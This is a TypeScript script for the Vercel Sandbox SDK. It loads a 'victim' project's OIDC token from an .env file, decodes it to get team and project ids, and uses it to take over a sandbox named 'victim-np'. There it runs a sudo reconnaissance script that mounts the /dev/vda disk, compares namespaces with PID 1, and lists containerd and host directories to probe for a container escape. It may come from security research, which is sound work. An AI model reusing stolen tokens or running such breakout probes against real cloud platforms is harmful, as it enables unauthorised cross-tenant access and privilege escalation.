import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const SCRIPT = String.raw`
echo "===== sudo root check ====="
sudo id
echo "===== /run contents ====="
ls -la /run/ 2>&1 | head -30
echo "--- /run/containerd ---"
ls -la /run/containerd/ 2>&1
echo "--- /run/cell ---"
ls -la /run/cell/ 2>&1
echo "--- /run/apm ---"
ls -la /run/apm/ 2>&1
echo "===== mount /dev/vda as root ====="
mkdir -p /mnt/vda
sudo mount -o ro /dev/vda /mnt/vda 2>&1
echo "mount exit: $?"
ls -laR /mnt/vda 2>&1 | head -60
echo "===== namespaces PID1 vs self ====="
echo "PID1 ns:"; ls -la /proc/1/ns/ 2>/dev/null | awk '{print $9, $11}'
echo "self ns:"; ls -la /proc/self/ns/ 2>/dev/null | awk '{print $9, $11}'
echo "===== mountinfo interesting ====="
grep -E "cell|vercel|containerd|apm|vda|vdb" /proc/1/mountinfo 2>/dev/null | head -20
echo "===== host dirs reachable? ====="
ls -la /opt/ /opt/vercel/ 2>&1 | head -20
ls -la /etc/vercel 2>&1
echo DONE
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });